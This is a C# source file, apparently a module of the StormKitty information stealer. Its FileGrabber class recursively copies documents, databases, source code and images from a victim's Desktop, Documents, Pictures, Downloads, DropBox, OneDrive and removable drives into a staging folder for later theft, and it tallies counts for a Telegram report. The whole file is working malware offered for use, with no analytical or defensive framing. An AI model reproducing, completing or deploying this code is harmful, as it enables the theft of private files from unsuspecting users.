using System;
using System.IO;
using System.Threading;
using System.Collections.Generic;
using StormKitty;

namespace Stealer
{
    internal sealed class FileGrabber
    {
        private static string SavePath = "Grabber";

        // Target directories
        private static List<string> TargetDirs = new List<string>
        {
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive"),
        };

        // Grabber stats for telegram message
        private static string RecordFileType(string type)
        {
            switch (type)
            {
                case "Document":
                    {
                        Counter.GrabberDocuments++;
                        break;
                    }
                case "DataBase":
                    {
                        Counter.GrabberDatabases++;
                        break;
                    }
                case "SourceCode":
                    {
                        Counter.GrabberSourceCodes++;
                        break;
                    }
                case "Image":
                    {
                        Counter.GrabberImages++;
                        break;
                    }
            }
            return type;
        }


        // Detect file type by name
        private static string DetectFileType(string ExtensionName)
        {
            string FileExtension = ExtensionName
                .Replace(".", "").ToLower();
            foreach (KeyValuePair<string, string[]> Type in Config.GrabberFileTypes)
                foreach (string extension in Type.Value)
                    if (FileExtension.Equals(extension))
                        return RecordFileType(Type.Key);

            return null;
        }


        // Grab file
        private static void GrabFile(string path)
        {
            // Check file size
            FileInfo file = new FileInfo(path);
            if (file.Length > Config.GrabberSizeLimit) return;
            // Check file type
            string type = DetectFileType(file.Extension);
            if (type == null) return;
            // Get directory and file paths to copy
            string CopyDirectoryName = Path.Combine(SavePath, Path.GetDirectoryName(path)
                .Replace(Path.GetPathRoot(path), "DRIVE-" + Path.GetPathRoot(path).Replace(":", "")));
            string CopyFileName = Path.Combine(CopyDirectoryName, file.Name);
            // Create directory to copy. If not exists
            if (!Directory.Exists(CopyDirectoryName))
                Directory.CreateDirectory(CopyDirectoryName);
            // Copy file to created directory
            file.CopyTo(CopyFileName, true);
        }


        // Grab all files from directory
        private static void GrabDirectory(string path)
        {
            // If directory not exists => stop
            if (!Directory.Exists(path))
                return;
            // Get directories and files
            string[] dirs, files;
            try
            {
                dirs = Directory.GetDirectories(path);
                files = Directory.GetFiles(path);
            } catch (UnauthorizedAccessException) {
                return;
            } catch (AccessViolationException) {
                return;
            }
            // Grab files from directory and scan other directories
            foreach (string file in files)
                GrabFile(file);
            foreach (string dir in dirs)
                try { GrabDirectory(dir); } catch { };
        }

        // Run file grabber
        public static void Run(string sSavePath)
        {
            try
            {
                // Set save path
                SavePath = sSavePath;
                // Add USB, CD drives to grabber
                foreach (DriveInfo drive in DriveInfo.GetDrives())
                    if (drive.DriveType == DriveType.Removable && drive.IsReady)
                        TargetDirs.Add(drive.RootDirectory.FullName);
                // Create save directory if not exists
                if (!Directory.Exists(SavePath))
                    Directory.CreateDirectory(SavePath);
                // Threads list
                List<Thread> Threads = new List<Thread>();
                // Create threads
                foreach (string dir in TargetDirs)
                    try { Threads.Add(new Thread(() => GrabDirectory(dir))); } catch { };
                // Run threads
                foreach (Thread t in Threads)
                    t.Start();
                // Wait threads
                foreach (Thread t in Threads)
                    if (t.IsAlive) t.Join();
            } catch (Exception ex) { Console.WriteLine(ex);  }
        }

    }
}
